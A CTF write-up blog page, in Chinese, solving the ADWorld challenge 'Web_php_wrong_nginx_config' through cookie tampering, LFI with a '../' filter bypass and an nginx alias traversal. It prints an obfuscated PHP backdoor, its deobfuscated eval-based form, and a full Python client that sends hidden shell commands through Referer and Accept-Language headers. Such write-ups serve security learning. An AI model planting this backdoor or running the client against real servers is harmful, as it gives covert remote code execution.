@@ -1,0 +1,510 @@
+<html>
+
+<head>
+  <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>攻防世界 Web_php_wrong_nginx_config | 3ND</title>
+<link rel="shortcut icon" href="https://github.com/inspiringz/inspiringz.github.io/favicon.ico?v=1627821474317">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://github.com/inspiringz/inspiringz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="攻防世界 Web_php_wrong_nginx_config | 3ND - Atom Feed" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+0x01 信息收集
+dirsearch 扫描一下，获取如下信息：
+
+robots.txt
+
+User-agent: *Disallow:
+hint.php
+Hack.php
+
+
+
+访问 hint.php 提示: 配置文件也许有问题呀：/e..." />
+    <meta name="keywords" content="Writeup,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <!--<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>-->
+    <script src="/media/highlight.min.js"></script>
+</head>
+
+<body>
+  <div class="main">
+    <div class="main-content">
+      <div class="site-header">
+  <a href="https://github.com/inspiringz/inspiringz.github.io">
+  <img class="avatar" src="https://github.com/inspiringz/inspiringz.github.io/images/avatar.png?v=1627821474317" alt="">
+  </a>
+  <h1 class="site-title">
+    3ND
+  </h1>
+  <p class="site-description">
+    夏が終わった
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/inspiringz" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              攻防世界 Web_php_wrong_nginx_config
+            </h2>
+            <div class="post-info">
+              <span>
+                2019-10-06
+              </span>
+              <span>
+                9 min read
+              </span>
+              <span class="page-view" key="20191006123503" title="攻防世界 Web_php_wrong_nginx_config">
+              </span>
+              
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/writeup/" class="post-tag">
+                  # Writeup
+                </a>
+                
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/ctf/" class="post-tag">
+                  # CTF
+                </a>
+                
+            </div>
+            
+                <div class="post-content-wrapper">
+                  <div class="post-content">
+                    <figure data-type="image" tabindex="1"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20191006133041.png" alt="" loading="lazy"></figure>
+<h2 id="0x01-信息收集">0x01 信息收集</h2>
+<p>dirsearch 扫描一下，获取如下信息：</p>
+<ol>
+<li>robots.txt</li>
+</ol>
+<pre><code class="language-php">User-agent: *Disallow:
+hint.php
+Hack.php
+</code></pre>
+<ul>
+<li>
+<p>访问 hint.php 提示: 配置文件也许有问题呀：<code>/etc/nginx/sites-enabled/site.conf</code>.</p>
+</li>
+<li>
+<p>访问 hack.php 空白页面，留意到 Cookie <code>isLogin</code> 值为 0，尝试修改为 1.</p>
+</li>
+</ul>
+<ol start="2">
+<li><code>/admin/</code>、<code>/admin/admin.php</code>、<code>/admin/index.php</code>路径存在。</li>
+</ol>
+<p>isLogin 置 1 时访问 /admin/admin.php 进入管理中心页面，URL 如下：</p>
+<pre><code class="language-php">/admin/admin.php?file=index&amp;ext=php
+</code></pre>
+<h2 id="0x02-lfi-目录穿越">0x02 LFI &amp; 目录穿越</h2>
+<p>/admin/admin.php 处存在任意文件读取，<code>../</code>被过滤，可双写绕过，根据提示读取 <code>site.conf</code>:</p>
+<figure data-type="image" tabindex="2"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20191006125911.png" alt="" loading="lazy"></figure>
+<p>留意到以下片段：</p>
+<pre><code class="language-php">server {
+    location /web-img {
+        alias /images/;
+        autoindex on;
+    }
+}
+</code></pre>
+<p>这里 设置了 <code>/web-img</code> 为 <code>/images/</code> 的别名，<code>autoindex on</code> 开启了目录遍历，则存在 目录穿越：</p>
+<p><code>/web-img../</code> 则相当于 <code>/images/../</code> ：</p>
+<figure data-type="image" tabindex="3"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20191006131051.png" alt="" loading="lazy"></figure>
+<p>在 <code>/web-img../var/www/</code>下发现 <code>hack.php.bak</code>文件：</p>
+<pre><code class="language-php">&lt;?php
+$U='_/|U&quot;,&quot;/-/|U&quot;),ar|Uray|U(&quot;/|U&quot;,&quot;+&quot;),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle';
+$q='s[|U$i]=&quot;&quot;;$p=|U$ss($p,3);}|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s)){$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui';
+$M='l=&quot;strtolower|U&quot;;$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$';
+$z='r=@$r[|U&quot;HTTP_R|UEFERER|U&quot;];$r|U|Ua=@$r[&quot;HTTP_A|U|UCCEPT_LAN|UGUAGE|U&quot;];if|U($r|Ur&amp;|U&amp;$ra){$u=parse_|Uurl($r';
+$k='?:;q=0.([\\|Ud]))?,|U?/&quot;,$ra,$m)|U;if($|Uq&amp;&amp;$m){|U|U|U@session_start()|U|U;$s=&amp;$_SESSIO|UN;$ss=&quot;|Usubst|Ur&quot;;|U|U$s';
+$o='|U$l;|U){for|U($j=0;($j|U&lt;$c&amp;&amp;|U|U$i|U&lt;$|Ul);$j++,$i++){$o.=$t{$i}|U^$k|U{$j};\}\}|Ureturn $|Uo;}$r=$|U_SERV|UE|UR;$r';
+$N='|Uf($e){$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray(&quot;/';
+$C='an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut(&quot;|U&lt;$k&gt;$d&lt;/$k&gt;&quot;|U);@ses|U|Usion_des|Utroy();\}\}\}\}';
+$j='$k|Uh=&quot;|U|U42f7&quot;;$kf=&quot;e9ac&quot;;fun|Uction|U |Ux($t,$k){$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U&quot;&quot;;fo|Ur($i=0;$i&lt;';
+$R=str_replace('rO','','rOcreatrOe_rOrOfurOncrOtion');
+$J='kf|U),|U0,3));$p=&quot;|U&quot;;for(|U|U$|Uz=1;$z&lt;cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0){$';
+$x='r)|U;pa|Urse|U_str($u[&quot;qu|U|Uery&quot;],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul(&quot;/([\\|U|Uw])[|U\\w-]+|U(';
+$f=str_replace('|U','',$j.$o.$z.$x.$k.$M.$J.$q.$N.$U.$C);
+$g=create_function('',$f);
+$g();
+?&gt;
+</code></pre>
+<h2 id="0x03-php-backdoor">0x03 PHP Backdoor</h2>
+<p>echo $f 得到：</p>
+<pre><code class="language-php">&lt;?php
+$kh = &quot;42f7&quot;;
+$kf = &quot;e9ac&quot;;
+function x($t, $k)
+{
+    $c = strlen($k);
+    $l = strlen($t);
+    $o = &quot;&quot;;
+    for ($i = 0; $i &lt; $l;) {
+        for ($j = 0; $j &lt; $c &amp;&amp; $i &lt; $l; $j++, $i++) {
+            $o .= $t[$i] ^ $k[$j];
+        }
+    }
+    return $o;
+}
+$r = $_SERVER;
+$rr = @$r[&quot;HTTP_REFERER&quot;];
+$ra = @$r[&quot;HTTP_ACCEPT_LANGUAGE&quot;];
+if ($rr &amp;&amp; $ra) {
+    $u = parse_url($rr);
+    parse_str($u[&quot;query&quot;], $q);
+    $q = array_values($q);
+    preg_match_all(&quot;/([\\w])[\\w-]+(?:;q=0.([\\d]))?,?/&quot;, $ra, $m);
+    if ($q &amp;&amp; $m) {
+        @session_start();
+        $s =&amp; $_SESSION;
+        $ss = &quot;substr&quot;;
+        $sl = &quot;strtolower&quot;;
+        $i = $m[1][0] . $m[1][1];
+        $h = $sl($ss(md5($i . $kh), 0, 3));
+        $f = $sl($ss(md5($i . $kf), 0, 3));
+        $p = &quot;&quot;;
+        for ($z = 1; $z &lt; count($m[1]); $z++) {
+            $p .= $q[$m[2][$z]];
+        }
+        if (strpos($p, $h) === 0) {
+            $s[$i] = &quot;&quot;;
+            $p = $ss($p, 3);
+        }
+        if (array_key_exists($i, $s)) {
+            $s[$i] .= $p;
+            $e = strpos($s[$i], $f);
+            if ($e) {
+                $k = $kh . $kf;
+                ob_start();
+                @eval(@gzuncompress(@x(@base64_decode(preg_replace(array(&quot;/_/&quot;, &quot;/-/&quot;), array(&quot;/&quot;, &quot;+&quot;), $ss($s[$i], 0, $e))), $k)));
+                $o = ob_get_contents();
+                ob_end_clean();
+                $d = base64_encode(x(gzcompress($o), $k));
+                print &quot;&lt;{$k}&gt;{$d}&lt;/{$k}&gt;&quot;;
+                @session_destroy();
+            }
+        }
+    }
+}
+</code></pre>
+<p>为一 PHP 混淆后门程序，在 <a href="https://www.cnblogs.com/go2bed/p/5920811.html">一个PHP混淆后门的分析</a> 处找到交互式的 Python 2 利用程序：</p>
+<pre><code class="language-python"># encoding: utf-8
+
+from random import randint,choice
+from hashlib import md5
+import urllib
+import string
+import zlib
+import base64
+import requests
+import re
+
+def choicePart(seq,amount):
+    length = len(seq)
+    if length == 0 or length &lt; amount:
+        print 'Error Input'
+        return None
+    result = []
+    indexes = []
+    count = 0
+    while count &lt; amount:
+        i = randint(0,length-1)
+        if not i in indexes:
+            indexes.append(i)
+            result.append(seq[i])
+            count += 1
+            if count == amount:
+                return result
+
+def randBytesFlow(amount):
+    result = ''
+    for i in xrange(amount):
+        result += chr(randint(0,255))
+    return  result
+
+def randAlpha(amount):
+    result = ''
+    for i in xrange(amount):
+        result += choice(string.ascii_letters)
+    return result
+
+def loopXor(text,key):
+    result = ''
+    lenKey = len(key)
+    lenTxt = len(text)
+    iTxt = 0
+    while iTxt &lt; lenTxt:
+        iKey = 0
+        while iTxt&lt;lenTxt and iKey&lt;lenKey:
+            result += chr(ord(key[iKey]) ^ ord(text[iTxt]))
+            iTxt += 1
+            iKey += 1
+    return result
+
+
+def debugPrint(msg):
+    if debugging:
+        print msg
+
+# config
+debugging = False
+keyh = &quot;42f7&quot; # $kh
+keyf = &quot;e9ac&quot; # $kf
+xorKey = keyh + keyf
+url = 'http://111.198.29.45:48754/hack.php'
+defaultLang = 'zh-CN'
+languages = ['zh-TW;q=0.%d','zh-HK;q=0.%d','en-US;q=0.%d','en;q=0.%d']
+proxies = None # {'http':'http://127.0.0.1:8080'} # proxy for debug
+
+sess = requests.Session()
+
+# generate random Accept-Language only once each session
+langTmp = choicePart(languages,3)
+indexes = sorted(choicePart(range(1,10),3), reverse=True)
+
+acceptLang = [defaultLang]
+for i in xrange(3):
+    acceptLang.append(langTmp[i] % (indexes[i],))
+acceptLangStr = ','.join(acceptLang)
+debugPrint(acceptLangStr)
+
+init2Char = acceptLang[0][0] + acceptLang[1][0] # $i
+md5head = (md5(init2Char + keyh).hexdigest())[0:3]
+md5tail = (md5(init2Char + keyf).hexdigest())[0:3] + randAlpha(randint(3,8))
+debugPrint('$i is %s' % (init2Char))
+debugPrint('md5 head: %s' % (md5head,))
+debugPrint('md5 tail: %s' % (md5tail,))
+
+# Interactive php shell
+cmd = raw_input('phpshell &gt; ')
+while cmd != '':
+    # build junk data in referer
+    query = []
+    for i in xrange(max(indexes)+1+randint(0,2)):
+        key = randAlpha(randint(3,6))
+        value = base64.urlsafe_b64encode(randBytesFlow(randint(3,12)))
+        query.append((key, value))
+    debugPrint('Before insert payload:')
+    debugPrint(query)
+    debugPrint(urllib.urlencode(query))
+
+    # encode payload
+    payload = zlib.compress(cmd)
+    payload = loopXor(payload,xorKey)
+    payload = base64.urlsafe_b64encode(payload)
+    payload = md5head + payload
+
+    # cut payload, replace into referer
+    cutIndex = randint(2,len(payload)-3)
+    payloadPieces = (payload[0:cutIndex], payload[cutIndex:], md5tail)
+    iPiece = 0
+    for i in indexes:
+        query[i] = (query[i][0],payloadPieces[iPiece])
+        iPiece += 1
+    referer = url + '?' + urllib.urlencode(query)
+    debugPrint('After insert payload, referer is:')
+    debugPrint(query)
+    debugPrint(referer)
+
+    # send request
+    r = sess.get(url,headers={'Accept-Language':acceptLangStr,'Referer':referer},proxies=proxies)
+    html = r.text
+    debugPrint(html)
+
+    # process response
+    pattern = re.compile(r'&lt;%s&gt;(.*)&lt;/%s&gt;' % (xorKey,xorKey))
+    output = pattern.findall(html)
+    if len(output) == 0:
+        print 'Error,  no backdoor response'
+        cmd = raw_input('phpshell &gt; ')
+        continue
+    output = output[0]
+    debugPrint(output)
+    output = output.decode('base64')
+    output = loopXor(output,xorKey)
+    output = zlib.decompress(output)
+    print output
+    cmd = raw_input('phpshell &gt; ')
+</code></pre>
+<p>连接上 <code>hack.php</code> 即可获取 flag：</p>
+<figure data-type="image" tabindex="4"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20191006132157.png" alt="" loading="lazy"></figure>
+<h2 id="0x04-nginx-安全配置">0x04 Nginx 安全配置</h2>
+<ol>
+<li>
+<p><a href="http://drop.cnpanda.net/#!/drops/201.Nginx%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E7%A0%94%E7%A9%B6">Wooyun Drops - Nginx安全配置研究</a></p>
+</li>
+<li>
+<p><a href="https://xz.aliyun.com/t/4855">Nginx配置不当可能导致的安全问题</a></p>
+</li>
+<li>
+<p><a href="https://xz.aliyun.com/t/2692">利用GIXY发现错误的Nginx配置</a></p>
+</li>
+</ol>
+
+                  </div>
+                  <div class="toc-container">
+                    <div style="position: sticky;
+                    top: 20px;">
+                    <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#0x01-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">0x01 信息收集</a></li>
+<li><a href="#0x02-lfi-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A">0x02 LFI &amp; 目录穿越</a></li>
+<li><a href="#0x03-php-backdoor">0x03 PHP Backdoor</a></li>
+<li><a href="#0x04-nginx-%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE">0x04 Nginx 安全配置</a></li>
+</ul>
+</li>
+</ul>
+
+                  </div>
+                  </div>
+                </div>
+          </article>
+        </div>
+
+        
+          <div class="nearby-post" style="padding: 24px 32px;">
+            <div class="prev-post" style="float: left;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter;text-align: left;">上一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-10-07-adworld-web-writeup-2/">
+                <h3 class="post-title" style="text-align: left;">
+                  攻防世界 ADWorld Web 部分题解（2）
+                </h3>
+              </a>
+            </div>
+            <div class="next-posts" style="float: right;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter; text-align: right;">下一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-09-14-file-operation-unserialization-via-phar/">
+                <h3 class="post-title" style="
+                text-align: right;">
+                  利用 phar 拓展 PHP 反序列化攻击面
+                </h3>
+              </a>
+            </div>
+          </div>
+          
+
+                
+
+                                <div class="site-footer">
+  
+  <a class="rss" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+    </div>
+  </div>
+
+  <script>
+    hljs.highlightAll();
+
+    let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+    // This should probably be throttled.
+    // Especially because it triggers during smooth scrolling.
+    // https://lodash.com/docs/4.17.10#throttle
+    // You could do like...
+    // window.addEventListener("scroll", () => {
+    //    _.throttle(doThatStuff, 100);
+    // });
+    // Only not doing it here to keep this Pen dependency-free.
+
+    window.addEventListener("scroll", event => {
+      let fromTop = window.scrollY;
+
+      mainNavLinks.forEach((link, index) => {
+        let section = document.getElementById(decodeURI(link.hash).substring(1));
+        let nextSection = null
+        if (mainNavLinks[index + 1]) {
+          nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+        }
+        if (section.offsetTop <= fromTop) {
+          if (nextSection) {
+            if (nextSection.offsetTop > fromTop) {
+              link.classList.add("current");
+            } else {
+              link.classList.remove("current");
+            }
+          } else {
+            link.classList.add("current");
+          }
+        } else {
+          link.classList.remove("current");
+        }
+      });
+    });
+  </script>
+<script src="/media/view-support.js"></script>
+<script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js'], function () {
+    var pageview = window.pageview(AV, {
+      appId: 'HRVNDkHV80Fpk9M8c5GQqjwy-gzGzoHsz',
+      appKey: 'nsyqncNCSWSOkkns1wvDlUrh',
+      appClass: 'Gridea',
+    });
+    $('.page-view').each(function () {
+      var $this = $(this);
+      var key = $this.attr('key');
+      var title = $this.attr('title');
+      pageview.increase(key, title, function(view) {
+        $("[key='" + key +"']").text(view+' views');
+      });
+    });
+  });
+</script>
+
+</body>
+
+</html>
